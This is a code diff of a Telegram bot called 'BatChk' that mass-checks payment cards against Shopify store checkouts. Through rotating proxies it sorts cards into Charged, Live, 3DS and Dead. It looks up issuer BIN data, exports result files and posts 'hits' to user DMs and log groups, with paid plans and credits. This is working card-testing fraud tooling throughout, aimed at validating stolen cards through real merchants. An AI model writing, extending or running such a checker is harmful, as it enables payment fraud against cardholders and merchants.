                       f"resp={resp!r} → {verdict}")
 
         if verdict in ("CHARGED", "TDS", "LIVE", "DEAD"):
             return verdict, resp, price, currency
-        # RETRY → continue to next site
+
+        # RETRY or ERROR → try next site
+        if attempt < max_sites - 1:
+            if verdict == "RETRY":
+                await asyncio.sleep(0.2)
+            continue
 
     return "ERROR", last_resp, price, currency
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PERSISTENT HTTP SESSION FOR /sh
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_SH_HTTP: Optional[aiohttp.ClientSession] = None
-_BIN_CACHE: dict = {}
-
-async def _sh_session() -> aiohttp.ClientSession:
-    global _SH_HTTP
-    if _SH_HTTP is None or _SH_HTTP.closed:
-        conn = aiohttp.TCPConnector(limit=200, limit_per_host=60,
-                                    keepalive_timeout=60, ssl=False)
-        _SH_HTTP = aiohttp.ClientSession(
-            connector=conn,
-            headers={"User-Agent": "Mozilla/5.0 (BatChk/17)"},
-            timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
-        )
-    return _SH_HTTP
-
-async def _bin_lookup(bin6: str) -> dict:
-    if bin6 in _BIN_CACHE:
-        return _BIN_CACHE[bin6]
-    try:
-        result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
-    except Exception:
-        result = {}
-    _BIN_CACHE[bin6] = result
-    return result
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MISC HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+_BIN_CACHE: dict = {}
+
 def _te(eid: str, fb: str = "●") -> str:
     return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
 
 def _plan_eid(plan: str) -> str:
     norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
-    if norm in PLAN_EMOJIS:
-        return PLAN_EMOJIS[norm]
+    if norm in PLAN_EMOJIS:      return PLAN_EMOJIS[norm]
     for k, v in PLAN_EMOJIS.items():
-        if k in norm: return v
+        if k in norm:             return v
     return PRO_EMOJI_ID
 
 def _user_link(user) -> str:
@@ -633,7 +457,7 @@ def _fmt_price(price: str, currency: str) -> str:
             return f"{v:.2f} {escape(currency)}"
     except Exception:
         pass
-    return "0-20$"
+    return "0.00 USD"
 
 def _is_premium(ud: dict, uid: int) -> bool:
     return (uid == OWNER_ID or ud.get("premium", False)
@@ -645,9 +469,16 @@ def _get_ud(uid: int, ctx) -> dict:
 def _sid() -> str:
     return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BIN FORMATTER
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _bin_lookup(bin6: str) -> dict:
+    if bin6 in _BIN_CACHE:
+        return _BIN_CACHE[bin6]
+    try:
+        result = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
+    except Exception:
+        result = {}
+    _BIN_CACHE[bin6] = result
+    return result
+
 def _bin_str(bd: dict) -> str:
     scheme  = escape(str(bd.get("scheme",  "N/A")).upper())
     bank    = escape(str(bd.get("bank",    "N/A")))
@@ -658,6 +489,7 @@ def _bin_str(bd: dict) -> str:
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESULT MESSAGE BUILDER
+# (used for both /sh and the DM hit messages)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def build_result_msg(
     card: str, resp: str, verdict: str,
@@ -667,29 +499,26 @@ def build_result_msg(
     ulink     = _user_link(user)
     peid      = _plan_eid(plan)
     ts        = _fmt_time(elapsed)
-    price_str = _fmt_price(price, currency)
     bin_s     = _bin_str(bin_data)
     ch_link   = f'<a href="{BOT_CHANNEL}">[❆]</a>'
     safe_resp = escape(resp)
 
     if verdict == "CHARGED":
-        eid        = random.choice(CHARGED_EMOJI_IDS)
-        status_ln  = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
-        gate_ln    = f'<b>Gate ➳ Shopify | {price_str}</b>'
+        eid       = random.choice(CHARGED_EMOJI_IDS)
+        status_ln = f'<b>{ch_link} Charged {_te(eid,"💎")}</b>'
+        gate_ln   = f'<b>Gate ➳ Shopify | {_fmt_price(price, currency)}</b>'
     elif verdict == "TDS":
-        live_eid   = get_random_live_emoji()
-        status_ln  = f'<b>{ch_link} Live {_te(live_eid,"✅")} [3DS]</b>'
-        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
+        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")} [3DS]</b>'
+        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'
     elif verdict == "LIVE":
-        live_eid   = get_random_live_emoji()
-        status_ln  = f'<b>{ch_link} Live {_te(live_eid,"✅")}</b>'
-        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
+        status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")}</b>'
+        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'
     elif verdict == "DEAD":
-        status_ln  = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
-        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
-    else:   # ERROR
-        status_ln  = f'<b>{ch_link} Error {_te(DECLINED_EMOJI_ID,"⚠️")}</b>'
-        gate_ln    = f'<b>Gate ➳ Shopify | 0-20$</b>'
+        status_ln = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
+        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'
+    else:
+        status_ln = f'<b>{ch_link} Error {_te(DECLINED_EMOJI_ID,"⚠️")}</b>'
+        gate_ln   = f'<b>Gate ➳ Shopify | 0-20$</b>'
 
     return (
         f"{status_ln}\n\n"
@@ -705,144 +534,61 @@ def build_result_msg(
         f"<b>{_te(DEV_EMOJI_ID,'⚡')} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,'⭐')}</b>"
     )
 
-_build_result_msg = build_result_msg   # backward-compat alias
+_build_result_msg = build_result_msg   # compat alias
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MSH BUTTONS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def _msh_buttons(sid: str, running: bool) -> RawMarkup:
-    s  = MSH_SESSIONS.get(sid, {})
-    ch = s.get("charged", 0)
-    lv = s.get("live",    0)
-    ck = s.get("checked", 0)
-    rows = [
-        [
-            _btn(f"Charged ({ch})", cb=f"{_CB_RESULT}:{sid}:charged",
-                 style="primary", icon=BTN_CHARGED_EMOJI_ID),
-            _btn(f"Live ({lv})", cb=f"{_CB_RESULT}:{sid}:live",
-                 style="primary", icon=BTN_LIVE_EMOJI_ID),
-        ],
-        [_btn(f"All ({ck})", cb=f"{_CB_RESULT}:{sid}:all",
-              style="primary", icon=BTN_ALL_EMOJI_ID)],
-    ]
-    if running:
-        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
-                          style="danger", icon=BTN_STOP_EMOJI_ID)])
-    return RawMarkup(rows)
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MSH PROGRESS TEXT
+# PROGRESS TEXT  (new UI — exact match to user spec)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _progress_text(sess: dict) -> str:
-    ts    = _fmt_time(time.time() - sess["start_time"])
-    ulink = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
+    ts   = _fmt_time(time.time() - sess["start_time"])
+    uobj = sess.get("user_obj")
+    ulink = _user_link(uobj) if uobj else "User"
     peid  = sess.get("plan_eid", PRO_EMOJI_ID)
+
     return (
         f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
         f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
         f'<b>Charged ➳ {sess["charged"]} {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
-        f'<b>Live    ➳ {sess["live"]} {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
+        f'<b>Live    ➳ {sess["approved"]} {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
         f'<b>Dead    ➳ {sess["dead"]} {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
         f'<b>Errors  ➳ {sess["errors"]} {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>\n'
-        f'<b>Proxies ➳ {sess.get("proxy_count", len(_ALL_PROXIES))}</b>\n'
         f'<b>Time    ➳ {ts}</b>\n'
         f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
         f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
     )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MSH RESULT FILE
+# BUTTONS  — Live | All | Stop
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def _make_result_file(sess: dict, kind: str) -> tuple:
-    if kind == "charged":
-        cards = sess.get("charged_cards", [])
-    elif kind == "live":
-        cards = sess.get("live_cards", [])
-    elif kind == "dead":
-        cards = sess.get("dead_cards", [])
-    else:
-        cards = (sess.get("charged_cards",[]) + sess.get("live_cards",[])
-                 + sess.get("dead_cards",[])  + sess.get("error_cards",[]))
+def _msh_buttons(sid: str, running: bool) -> RawMarkup:
+    sess  = MSH_SESSIONS.get(sid, {})
+    live_n = sess.get("approved", 0)
+    all_n  = sess.get("checked",  0)
 
-    label     = kind.capitalize()
-    user_name = (sess.get("user_obj") and
-                 (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"
-    lines = [
-        f"Gate  ➳ Shopify | 0-20$",
-        f"Type  ➳ {label}",
-        f"Total ➳ {len(cards)}",
-        f"User  ➳ {user_name} ({sess.get('plan','TRIAL')})",
-        f"Dev   ➳ {BOT_NAME}",
-        "━━━━━━━━━━━━━━",
-    ]
-    for cd in cards:
-        bi   = cd.get("bin_info", {})
-        flag = bi.get("country_emoji", "")
-        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
-        lines += [
-            f"Card   ➳ {cd.get('card','N/A')}",
-            f"Status ➳ {cd.get('verdict','N/A')}",
-            f"Gate   ➳ Shopify | {cd.get('price','0.00')} {cd.get('currency','USD')}",
-            f"Resp   ➳ {cd.get('resp','N/A')}",
-            f"Bin    ➳ {bi.get('scheme','N/A')} - {bi.get('bank','N/A')} - {cdisp}",
-            "━━━━━━━━━━━━━━",
-        ]
-    buf   = BytesIO("\n".join(lines).encode("utf-8"))
-    buf.seek(0)
-    fname = f"BatChk_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-    return buf, fname, len(cards)
+    rows = [[
+        _btn(f"Live ({live_n})", cb=f"{_CB_RESULT}:{sid}:live",
+             style="success", icon=BTN_LIVE_EMOJI_ID),
+        _btn(f"All ({all_n})",  cb=f"{_CB_RESULT}:{sid}:all",
+             style="primary",  icon=BTN_ALL_EMOJI_ID),
+    ]]
+    if running:
+        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
+                          style="danger", icon=BTN_STOP_EMOJI_ID)])
+    return RawMarkup(rows)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# HIT NOTIFICATION
+# PROGRESS UPDATE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def _send_hit(bot, chat_id, user, reply_id, text, verdict):
-    try:
-        await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML",
-                               disable_web_page_preview=True,
-                               reply_to_message_id=reply_id)
-    except Exception:
-        try:
-            await bot.send_message(chat_id=chat_id, text=text,
-                                   parse_mode="HTML", disable_web_page_preview=True)
-        except Exception:
-            pass
-
-    if HIT_LOG_GROUP_ID:
-        try:
-            eid   = (random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED"
-                     else get_random_live_emoji())
-            label = "Charged" if verdict == "CHARGED" else "Live"
-            grp   = (
-                f'<b><a href="{BOT_CHANNEL}">[❆]</a> {label} '
-                f'{_te(eid,"💎" if verdict=="CHARGED" else "✅")}</b>\n'
-                f'<b>Gate ➳ Shopify Payments</b>\n'
-                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {escape(verdict)}</b>\n'
-                f'<b>{_user_link(user)}</b>'
-            )
-            await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=grp,
-                                   parse_mode="HTML", disable_web_page_preview=True)
-        except Exception:
-            pass
-
-    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
-        try:
-            await asyncio.sleep(0.3)
-            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
-                                   parse_mode="HTML", disable_web_page_preview=True)
-        except Exception:
-            pass
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PROGRESS EDIT
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def _update_progress(bot, sid, force=False):
+async def _update_progress(bot, sid: str, force: bool = False):
     sess = MSH_SESSIONS.get(sid)
     if not sess: return
     now = time.time()
-    if not force and (now - sess.get("last_update", 0) < 1.5): return
+    if not force and (now - sess.get("last_update", 0)) < 1.0:
+        return
     text    = _progress_text(sess)
     running = sess["status"] == "CHECKING"
-    if text == sess.get("last_text") and not force: return
+    if text == sess.get("last_text") and not force:
+        return
     try:
         await bot.edit_message_text(
             chat_id=sess["chat_id"], message_id=sess["msg_id"],
@@ -856,22 +602,132 @@ async def _update_progress(bot, sid, force=False):
         pass
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# RESULT FILE BUILDER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _make_result_file(sess: dict, kind: str) -> tuple:
+    if kind == "live":
+        cards = sess.get("live_cards", [])
+        label = "Live"
+    elif kind == "dead":
+        cards = sess.get("dead_cards", [])
+        label = "Dead"
+    else:
+        cards = (sess.get("charged_cards", []) + sess.get("live_cards", [])
+                 + sess.get("dead_cards",   []) + sess.get("error_cards", []))
+        label = "All"
+
+    uname = (sess.get("user_obj") and
+             (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"
+    plan  = sess.get("plan", "TRIAL")
+
+    lines = [
+        f"Gate ➳ Shopify | 0-5 USD",
+        f"Result ➳ {label}",
+        f"Total ➳ {len(cards)}",
+        f"User ➳ {uname} ({plan})",
+        f"Dev ➳ {BOT_NAME}",
+        "━━━━━━━━━━━━━━",
+    ]
+    for cd in cards:
+        bi   = cd.get("bin_info", {})
+        flag = bi.get("country_emoji", "")
+        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
+        resp = cd.get("resp", cd.get("response", "N/A"))
+        ver  = cd.get("verdict", "N/A")
+        prc  = cd.get("price", "0.00")
+        cur  = cd.get("currency", "USD")
+
+        if "ORDER_PAID" in resp.upper() or ver == "CHARGED":
+            status = "Charged"; raw_disp = f"{resp} | {prc} {cur}"
+        elif ver in ("LIVE", "TDS"):
+            status = "Live";    raw_disp = resp
+        elif ver == "DEAD":
+            status = "Dead";    raw_disp = resp
+        else:
+            status = "Error";   raw_disp = resp
+
+        lines += [
+            f"Card ➳ {cd.get('card','N/A')}",
+            f"Status ➳ {status}",
+            f"Gate ➳ Shopify | {prc} {cur}",
+            f"Resp ➳ {raw_disp}",
+            f"Brand ➳ {bi.get('scheme','N/A')}",
+            f"Issuer ➳ {bi.get('bank','N/A')}",
+            f"Country ➳ {cdisp}",
+            "━━━━━━━━━━━━━━",
+        ]
+
+    buf   = BytesIO("\n".join(lines).encode("utf-8"))
+    buf.seek(0)
+    fname = f"BatChk_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    return buf, fname, len(cards)
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# HIT NOTIFICATION  — DM + log groups
+# CHARGED → user DM + HIT_LOG_GROUP + EXTRA_CHARGED_GROUP
+# LIVE    → user DM only
+# DEAD    → nothing
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _send_hit(bot, user, text: str, verdict: str):
+    """Send CHARGED/LIVE hit to user DM and/or log groups."""
+
+    # ── 1. User DM (CHARGED and LIVE) ───────────────────
+    try:
+        await bot.send_message(
+            chat_id=user.id, text=text,
+            parse_mode="HTML", disable_web_page_preview=True,
+        )
+    except Exception as e:
+        logging.warning(f"[HIT] DM failed uid={user.id}: {e}")
+
+    # ── 2. Hit-log group (CHARGED and LIVE) ─────────────
+    if HIT_LOG_GROUP_ID:
+        try:
+            eid   = (random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED"
+                     else LIVE_EMOJI_ID)
+            label = "Charged" if verdict == "CHARGED" else "Live"
+            grp   = (
+                f'<b>{_te(HIT_GATE_EMOJI_ID,"🛒")} {label} {_te(eid,"💎" if verdict=="CHARGED" else "✅")}</b>\n'
+                f'<b>Gate ➳ Shopify Payments</b>\n'
+                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} User ➳ {_user_link(user)}</b>'
+            )
+            await bot.send_message(
+                chat_id=HIT_LOG_GROUP_ID, text=grp,
+                parse_mode="HTML", disable_web_page_preview=True,
+            )
+        except Exception as e:
+            logging.warning(f"[HIT] Log group failed: {e}")
+
+    # ── 3. Extra charged group (CHARGED only) ───────────
+    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
+        try:
+            await asyncio.sleep(0.5)
+            await bot.send_message(
+                chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
+                parse_mode="HTML", disable_web_page_preview=True,
+            )
+        except Exception as e:
+            logging.warning(f"[HIT] Extra group failed: {e}")
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # SESSION FACTORY
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
-                       total, user_obj, plan) -> dict:
-    peid = _plan_eid(plan)
+def create_msh_session(
+    sid, chat_id, user_id, msg_id, user_msg_id,
+    total, user_obj, plan,
+) -> dict:
     sess = {
-        "status": "CHECKING",
-        "chat_id": chat_id, "user_id": user_id,
-        "msg_id": msg_id, "user_msg_id": user_msg_id,
-        "total": total, "checked": 0,
-        "charged": 0, "live": 0, "dead": 0, "errors": 0,
+        "status":   "CHECKING",
+        "chat_id":  chat_id, "user_id": user_id,
+        "msg_id":   msg_id,  "user_msg_id": user_msg_id,
+        "total":    total,   "checked": 0,
+        "charged":  0, "approved": 0, "dead": 0, "errors": 0,
         "start_time": time.time(),
         "charged_cards": [], "live_cards": [],
-        "dead_cards": [],   "error_cards": [],
+        "dead_cards":    [], "error_cards": [], "tds_cards": [],
         "tasks": [], "last_text": "", "last_update": 0,
-        "user_obj": user_obj, "plan": plan, "plan_eid": peid,
+        "user_obj": user_obj, "plan": plan,
+        "plan_eid": _plan_eid(plan),
     }
     MSH_SESSIONS[sid] = sess
     return sess
@@ -883,37 +739,23 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
     sess = MSH_SESSIONS.get(sid)
     if not sess: return
 
-    # Always use the full global proxy pool so every worker has all proxies.
-    # Reload from file if the caller passed an empty list (shouldn't happen,
-    # but this is the safety net).
     effective_proxies = proxies if proxies else _ALL_PROXIES
     if not effective_proxies:
-        effective_proxies = _load_proxies()   # last-resort reload
-    sess["proxy_count"] = len(effective_proxies)
+        effective_proxies = _load_proxies()
+
     logging.info(f"[MSH] {sid} — {len(effective_proxies)} proxies, "
                  f"{len(valid_cards)} cards, concurrency={MAX_CONCURRENT}")
 
-    conn = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 4,
-                                 limit_per_host=MAX_CONCURRENT,
-                                 keepalive_timeout=60, ssl=False,
-                                 enable_cleanup_closed=True, ttl_dns_cache=600)
-    http  = aiohttp.ClientSession(
-        connector=conn,
-        headers={"User-Agent": "Mozilla/5.0 (BatChk/17)"},
-        timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
-    )
-    sess["_connector"] = conn
-    sess["_session"]   = http
     sem = asyncio.Semaphore(MAX_CONCURRENT)
 
-    async def worker(card_fmt, cc_num):
+    async def worker(card_fmt: str, cc_num: str):
         if sess.get("status") != "CHECKING": return
         async with sem:
             if sess.get("status") != "CHECKING": return
             t0 = time.time()
             try:
                 verdict, resp, price, currency = await _check_card_with_retry(
-                    http, card_fmt, all_sites, effective_proxies,
+                    None, card_fmt, all_sites, effective_proxies,
                     max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                 )
             except asyncio.CancelledError:
@@ -927,8 +769,12 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
             except Exception:
                 bin_data = {}
 
-            rec = {"card": card_fmt, "verdict": verdict, "resp": resp,
-                   "price": price, "currency": currency, "bin_info": bin_data}
+            rec = {
+                "card": card_fmt, "verdict": verdict,
+                "resp": resp, "response": resp,
+                "price": price, "currency": currency,
+                "bin_info": bin_data,
+            }
             sess["checked"] += 1
 
             if verdict == "CHARGED":
@@ -936,58 +782,151 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 sess["charged_cards"].append(rec)
                 msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                        price, currency, elapsed, user, plan)
-                asyncio.create_task(_send_hit(bot, sess["chat_id"], user,
-                                              sess["user_msg_id"], msg, "CHARGED"))
+                # CHARGED → DM + log groups
+                asyncio.create_task(_send_hit(bot, user, msg, "CHARGED"))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
-            elif verdict in ("TDS", "LIVE"):
-                sess["live"] += 1
+
+            elif verdict == "TDS":
+                sess["approved"] += 1
+                sess["live_cards"].append(rec)
+                sess["tds_cards"].append(rec)
+                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
+                                       price, currency, elapsed, user, plan)
+                # TDS (live) → DM only
+                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
+                asyncio.create_task(_update_progress(bot, sid, force=True))
+
+            elif verdict == "LIVE":
+                sess["approved"] += 1
                 sess["live_cards"].append(rec)
                 msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                        price, currency, elapsed, user, plan)
-                asyncio.create_task(_send_hit(bot, sess["chat_id"], user,
-                                              sess["user_msg_id"], msg, "LIVE"))
+                # LIVE → DM only
+                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
                 asyncio.create_task(_update_progress(bot, sid, force=True))
+
             elif verdict == "DEAD":
                 sess["dead"] += 1
                 sess["dead_cards"].append(rec)
-            else:
+                # DEAD → no DM, no notification
+
+            else:  # ERROR
                 sess["errors"] += 1
                 sess["error_cards"].append(rec)
 
-            if sess["checked"] % PROGRESS_EVERY == 0 or sess["checked"] >= sess["total"]:
+            # Periodic progress update
+            if sess["checked"] % 5 == 0 or sess["checked"] >= sess["total"]:
                 asyncio.create_task(_update_progress(bot, sid))
 
-    tasks = [asyncio.create_task(worker(cf, cn)) for cf, cn in valid_cards
-             if sess.get("status") == "CHECKING"]
+    tasks = [
+        asyncio.create_task(worker(cf, cn))
+        for cf, cn in valid_cards
+        if sess.get("status") == "CHECKING"
+    ]
     sess["tasks"] = tasks
     await asyncio.gather(*tasks, return_exceptions=True)
-
-    try:
-        await http.close()
-        await conn.close()
-    except Exception:
-        pass
 
     if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
         MSH_SESSIONS[sid]["status"] = "FINISHED"
     await _update_progress(bot, sid, force=True)
-    logging.info(f"[MSH] {sid} done C:{sess['charged']} L:{sess['live']} "
-                 f"D:{sess['dead']} E:{sess['errors']}")
+    logging.info(
+        f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
+        f"D:{sess['dead']} E:{sess['errors']}"
+    )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /sh — SINGLE CARD
+# CALLBACK HANDLERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q     = update.callback_query
+    parts = q.data.split(":", 2)
+    if len(parts) < 3:
+        await q.answer("❌ Invalid.", show_alert=True); return
+
+    _, sid, kind = parts
+    sess = MSH_SESSIONS.get(sid)
+    if not sess:
+        await q.answer("⚠️ Session expired.", show_alert=True); return
+    if q.from_user.id != sess.get("user_id"):
+        await q.answer("❌ Not your session.", show_alert=True); return
+
+    # Button lock
+    locked_for = int(BUTTON_LOCK - (time.time() - sess["start_time"]))
+    if locked_for > 0:
+        await q.answer(f"⏳ Wait {locked_for}s", show_alert=True); return
+
+    buf, fname, count = _make_result_file(sess, kind)
+    if count == 0 and kind != "all":
+        label = {"live": "Live"}.get(kind, kind.capitalize())
+        await q.answer(f"❌ No {label} cards yet.", show_alert=True); return
+
+    await q.answer("📦 Generating file…")
+
+    labels = {"live": "Live ✅", "all": "All 📁"}
+    caption = (
+        f"<b>Result ➳ {labels.get(kind,'All')}</b>\n"
+        f"<b>Total ➳ {count}</b>\n"
+        f"<b>Gate ➳ Shopify Mass</b>"
+    )
+    try:
+        await context.bot.send_document(
+            chat_id=q.message.chat_id,
+            document=InputFile(buf, filename=fname),
+            caption=caption, parse_mode="HTML",
+            reply_to_message_id=sess.get("user_msg_id"),
+        )
+    except Exception as e:
+        logging.error(f"[MSH] send_document: {e}")
+        try:
+            buf.seek(0)
+            await context.bot.send_document(
+                chat_id=q.message.chat_id,
+                document=InputFile(buf, filename=fname),
+                caption=caption, parse_mode="HTML",
+            )
+        except Exception:
+            pass
+
+
+async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q     = update.callback_query
+    parts = q.data.split(":", 1)
+    if len(parts) < 2:
+        await q.answer("❌ Invalid.", show_alert=True); return
+
+    _, sid = parts
+    sess = MSH_SESSIONS.get(sid)
+    if not sess:
+        await q.answer("⚠️ Already finished.", show_alert=True); return
+    if q.from_user.id != sess.get("user_id"):
+        await q.answer("❌ Not your session.", show_alert=True); return
+    if sess["status"] != "CHECKING":
+        await q.answer("ℹ️ Not running.", show_alert=True); return
+
+    # Stop immediately
+    sess["status"] = "STOPPED"
+    for t in sess.get("tasks", []):
+        if not t.done(): t.cancel()
+
+    await q.answer("🛑 Stopped.")
+    sess["last_text"] = ""
+    await _update_progress(context.bot, sid, force=True)
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# /sh — SINGLE CARD COMMAND
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     ud   = _get_ud(user.id, context)
 
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
-        await update.message.reply_text("🔧 <b>Bot under maintenance.</b>",
-                                        parse_mode="HTML"); return
+        await update.message.reply_text(
+            "🔧 <b>Bot under maintenance.</b>", parse_mode="HTML"); return
     if not context.bot_data.get("sh_on", True):
-        await update.message.reply_text("❌ <b>Single check disabled.</b>",
-                                        parse_mode="HTML"); return
+        await update.message.reply_text(
+            "❌ <b>Single check disabled.</b>", parse_mode="HTML"); return
 
+    # Parse card
     card = None
     if context.args:
         card = context.args[0].strip()
@@ -996,10 +935,10 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                update.message.reply_to_message.caption or "").strip()
         if txt: card = txt.split()[0]
 
-    if not card or card.count("|") < 3:
+    if not card or "|" not in card:
         await update.message.reply_text(
-            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>", parse_mode="HTML")
-        return
+            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>",
+            parse_mode="HTML"); return
 
     parts = card.split("|")
     if len(parts) != 4:
@@ -1011,6 +950,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_expired(mm, yy):
         await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return
 
+    # Credits / cooldown
     premium = _is_premium(ud, user.id)
     if not premium:
         if ud.get("credits", 0) <= 0:
@@ -1020,12 +960,14 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
